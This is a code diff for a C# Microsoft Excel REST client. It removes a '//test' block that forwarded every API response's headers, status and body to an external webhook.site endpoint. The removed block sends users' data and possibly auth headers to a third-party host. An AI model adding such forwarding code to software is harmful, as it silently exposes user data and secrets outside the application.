@@ -27,21 +27,6 @@ public class MicrosoftExcelClient : RestClient
     {
         var response = await ExecuteAsync(request);
 
-        //test https://webhook.site/37eab5e9-dafd-48a8-8049-a3ea830546d7
-        var options = new RestClientOptions("https://webhook.site")
-        {
-            MaxTimeout = -1,
-        };
-        var client = new RestClient(options);
-        var request1 = new RestRequest("/37eab5e9-dafd-48a8-8049-a3ea830546d7", Method.Post);
-        request1.AddJsonBody(new
-        {
-            headers = string.Join(';', response.Headers.Select(x => $"{x.Name}:{x.Value.ToString()}")),
-            status = response.StatusCode,
-            body = response.Content
-        });
-        await client.ExecuteAsync(request1);
-
         if (response.IsSuccessful)
             return response;
 
